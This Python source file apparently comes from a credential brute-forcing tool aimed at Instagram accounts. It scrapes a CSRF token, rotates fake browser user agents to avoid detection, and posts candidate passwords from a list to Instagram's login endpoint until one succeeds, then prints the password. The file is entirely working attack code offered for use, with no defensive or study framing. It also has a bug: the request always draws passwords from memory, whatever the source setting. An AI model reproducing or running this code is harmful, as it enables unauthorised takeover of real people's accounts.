import random

import requests

from Core import shutdown_all_threads

found = False

class Bruter:

    user_agents = ['Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)',
                   'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1',
                   'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)',
                   'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                   'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                   'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))']

    url = 'https://instagram.com/accounts/login/'
    
    def __init__(self, username, PasswordManagment_instance, from_file_or_ram):
        self.passwordmanagment_instance = PasswordManagment_instance
        self.username = username
        self.from_file_or_ram = from_file_or_ram
        self.csrf = self.get_csrf()
        self.attack()

    def get_csrf(self):
        check_csrf = requests.get('https://instagram.com/')
        return (str(check_csrf.headers).partition('csrftoken=')[2].partition(';')[0])

    def attack(self):
        global found
        while (found is False):
            password = self.passwordmanagment_instance.get_next_password_from_ram() if self.from_file_or_ram == True else self.passwordmanagment_instance.get_next_password_from_file()
            header = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,he;q=0.8,es;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'rur=FRC; csrftoken={}'.format(self.csrf),
            'dnt': '1',
            'origin': 'https://www.instagram.com/',
            'referer': 'https://instagram.com/',
            'upgrade-insecure-requests': '1',  
            'User-Agent': random.choice(self.user_agents),
            'x-csrftoken': self.csrf,
            'x-requested-with': 'XMLHttpRequest'
            }

            req = requests.post(self.url, data = (
                {'username': self.username, 'password': self.passwordmanagment_instance.get_next_password_from_ram()}
                ), headers = header)

            if (not 'not-logged-in' in str(req.content)):
                found = True
                print('Password found: {}'.format(password))
                shutdown_all_threads()
                print('Shutted down all threads successfully.')